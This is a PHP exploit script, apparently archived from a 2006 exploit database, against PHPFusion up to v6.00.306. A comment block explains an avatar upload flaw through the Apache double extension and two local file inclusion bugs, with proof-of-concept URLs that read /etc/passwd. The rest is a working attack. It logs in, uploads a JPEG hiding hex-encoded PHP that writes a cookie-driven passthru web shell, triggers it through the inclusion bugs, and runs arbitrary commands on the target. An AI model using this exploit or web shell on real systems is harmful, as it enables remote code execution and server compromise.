#!/usr/bin/php -q -d short_open_tag=on
<?
echo "PHPFusion <= v6.00.306 avatar mod_mime arbitrary file upload &\r\n";
echo "local inclusion vulnerabilities\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";

if ($argc<6) {
echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to PHPFusion\r\n";
echo "cmd:       a shell command\r\n";
echo "user/pass: you need a valid user account to upload an avatar\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /phpfusion/ your_username password cat ./../../config.php\r\n";
echo "php ".$argv[0]." localhost /phpfusion/ your_username password ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\r\n\r\n";
die;
}

/* explaination:

   software site: http://www.php-fusion.co.uk/

   description: "a light-weight open-source content management system (CMS)
   written in PHP. It utilises a mySQL database to store your site content and
   includes a simple, comprehensive adminstration system."

   tested versions:   PHPFusion v6.00.306
                      PHPFusion v6.00.207
                      PHPFusion v6.00.110


   i) vulnerable code in includes/update_profile_include.php at lines 69-90:

   ...
   $newavatar = $_FILES['user_avatar'];
	if ($userdata['user_avatar'] == "" && !empty($newavatar['name']) && is_uploaded_file($newavatar['tmp_name'])) {
		if (preg_match("/^[-0-9A-Z_\.\[\]]+$/i", $newavatar['name']) && $newavatar['size'] <= 30720) {
                       	$avatarext = strrchr($newavatar['name'],".");
			if (eregi(".gif", $avatarext) || eregi(".jpg", $avatarext) || eregi(".png", $avatarext)) {
				$avatarname = substr($newavatar['name'], 0, strrpos($newavatar['name'], "."));
				$avatarname = $avatarname."[".$userdata['user_id']."]".$avatarext;
				$set_avatar = "user_avatar='$avatarname', ";
				move_uploaded_file($newavatar['tmp_name'], IMAGES."avatars/".$avatarname);
				chmod(IMAGES."avatars/".$avatarname,0644);
				if ($size = @getimagesize(IMAGES."avatars/".$avatarname)) {
					if ($size['0'] > 100 || $size['1'] > 100) {
						unlink(IMAGES."avatars/".$avatarname);
						$set_avatar = "";
					}
				} else {
					unlink(IMAGES."avatars/".$avatarname);
					$set_avatar = "";
				}
			}
		}
	}
   ...

   A remote user can upload a malicious avatar with multiple extensions,
   (ex.: .php.php.gif-fakechars-) and with php code inside as EXIF metadata
   content.
   It seems that Apache mod_mime module considers double-extension files like
   file.php.gif[somefakechars] to be valid PHP files and runs the arbitrary
   code that has been uploaded. Actually I can't say which Apache versions, this
   was tested against Apache/1.3.27 with PHP/4.3.3

   A note: file is renamed like this
   .php.php[user_id].gif-fakechars-

   ii) vulnerable code in infusions/last_seen_users_panel/last_seen_users_panel.php
       at lines 12-16:

   ...
   if (file_exists(INFUSIONS."last_seen_users_panel/locale/".$settings['locale'].".php")) {
	include INFUSIONS."last_seen_users_panel/locale/".$settings['locale'].".php";
} else {
	include INFUSIONS."last_seen_users_panel/locale/English.php";
}
   ...

    $settings['locale'] var is not properly sanitized before to be used to
    include files so, if register_globals=on & magic_quotes_gpc=Off,
    you can include local resources, poc:

    http://[target]/[path]infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=../../../../../../../../../etc/passw%00
    http://[target]/[path]infusions/last_seen_users_panel/last_seen_users_panel.php?cmd=ls%20-la&settings[locale]=../../../../images/avatars/suntzu[1].jpg%00

    A note: if INFUSIONS constant is not defined, PHP will assume it as it is,
    as "INFUSIONS" string. On some system , no matters if "INFUSIONSlast_seen_users_panel/locale/........"
    path does not exist, you will go up from the non-existent dir of exactly four
    dirs to include the malicious avatar.
    This works against on 6.00.306

    iii) vulnerable code in setup.php at lines 14-15:

    ...
    $localeset = (isset($_GET['localeset']) ? $_GET['localeset'] : "English");
    include "locale/".$localeset."/setup.php";
    ...

    if this script is not deleted after installation, if magic_quotes_gpc=Off,
    you can include files from locale resources, poc:

    http://[target]/[path]/setup.php?localeset=../../../../../../../../../../etc/passwd%00
    http://[target]/[path]/setup.php?cmd=ls%20-la&localeset=../images/avatars/suntzu[1].jpg%00

    this tool tries to exploit all theese vulnerabilities, you need a valid user
    account to upload avatars
*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
function sendpacketiii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$pass=$argv[4];
$cmd="";$port=80;$proxy="";
for ($i=5; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$mypaths= array (
		 'images/avatars/',
		 '',
		 'infusions/last_seen_users_panel/'
		);

echo "step 0 -> Check if suntzu.php is already installed...\r\n";
for ($i=0; $i<=count($mypaths)-1; $i++)
{
$packet ="GET ".$p.$mypaths[$i]."suntzu.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"56789"))
{
  echo "Exploit succeeded...";
  $temp=explode("56789",$html);
  die("\r\n".$temp[1]."\r\n");
}
}

echo "step 1 -> login...\r\n";
$data ="user_name=".urlencode(trim($username));
$data.="&user_pass=".urlencode(trim($pass));
$data.="&login=Login";
$packet="POST ".$p."news.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."news.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: fusion_visited=yes; PHPSESSID=44ab49664b56b97036425427b1ffb8cf\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$temp2=explode(' ',$temp[1]);
$cookie=$temp2[0];
echo 'Your cookie: '.$cookie."\r\n";
$temp=explode("fusion_user=",$cookie);
$temp2=explode(".",$temp[1]);
$user_id=trim($temp2[0]);
echo 'Your user id: '.$user_id."\r\n";

echo "step 2 -> upload a malicious avatar with php code inside...\r\n";
$avatar=".php.php.gif-fakechars-";
$shell=
chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x07).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).
chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).
chr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).
chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
chr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).
chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).
chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x73).
chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5f).
chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).chr(0x29).
chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).chr(0x74).
chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(0x71).
chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).chr(0x70).
chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).chr(0x24).
chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).
chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).
chr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).
chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).
chr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).
chr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x3b).chr(0x70).chr(0x61).
chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).
chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).
chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).
chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x35).chr(0x36).chr(0x37).chr(0x38).
chr(0x39).chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).
chr(0x24).chr(0x66).chr(0x70).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).
chr(0x68).chr(0x6d).chr(0x6f).chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).
chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).
chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).
chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
chr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).chr(0x00).
chr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).
chr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).
chr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).chr(0x00);

/*
this image has this code inside as EXIF metadata content
<?php
$fp=fopen("suntzu.php","w");
fputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 56789;passthru(\$_COOKIE[cmd]);echo 56789;?>");
fclose($fp);
chmod("suntzu.php",777);
?>
*/

$data='-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_name"

'.$username.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_newpassword"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_newpassword2"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_email"

succcccccp@hotmail.com
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_hide_email"

1
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_location"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_month"

--
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_day"

--
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_year"

----
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_aim"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_icq"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_msn"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_yahoo"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_web"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_theme"

Default
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_offset"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_avatar"; filename="'.$avatar.'"
Content-Type: application/octet-stream

'.$shell.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_sig"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_hash"

'.md5($pass).'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="update_profile"

Update Profile
-----------------------------7d6ee3a7074a--
';


$packet ="POST ".$p."edit_profile.php? HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."edit_profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cookie: fusion_visited=yes; ".$cookie." PHPSESSID=44ab49664b56b97036425427b1ffb8cf\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketiii($packet);

echo "step 3 -> try to launch code inside image before has chmod()...\r\n";
for ($i=0; $i<=9; $i++)
{
$packet ="GET ".$p."images/avatars/.php.php[".$user_id."].gif-fakechars- HTTP/1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
}

echo "step 3b -> try to include through last_seen_users_panel.php\r\n";
//works with register_globals=on & magic_quotes_gpc=off
$xpl=urlencode("../../../../images/avatars/.php.php[".$user_id."].gif-fakechars-".chr(0x00));
$packet ="GET ".$p."infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=$xpl HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "step 3c -> try to include through setup.php script\r\n";
//works with magic_quotes_gpc=off
$xpl=urlencode("../images/avatars/.php.php[".$user_id."].gif-fakechars-".chr(0x00));
$packet ="GET ".$p."setup.php?localeset=$xpl HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "step 4 -> delete avatar...\r\n";
$data='-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_name"

'.$username.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_newpassword"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_newpassword2"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_email"

whattttt@hotmail.com
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_hide_email"

1
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_location"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_month"

--
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_day"

--
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_year"

----
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_aim"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_icq"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_msn"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_yahoo"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_web"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_theme"

Default
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_offset"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_avatar"; filename="whatever"
Content-Type: application/octet-stream

what
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_sig"


-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="user_hash"

'.md5($pass).'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="update_profile"

Update Profile
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="del_avatar"

y
-----------------------------7d6ee3a7074a--
';

$packet ="POST ".$p."edit_profile.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."edit_profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cookie: fusion_visited=yes; ".$cookie." PHPSESSID=44ab49664b56b97036425427b1ffb8cf\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

echo "step 5 -> launch commands...\r\n";
for ($i=0; $i<=count($mypaths)-1; $i++)
{
$packet ="GET ".$p.$mypaths[$i]."suntzu.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"56789"))
{
  echo "Exploit succeeded...";
  $temp=explode("56789",$html);
  die("\r\n".$temp[1]."\r\n");
}
}
//if you are here...
echo "\r\nExploit failed...";
?>

# milw0rm.com [2006-05-07]
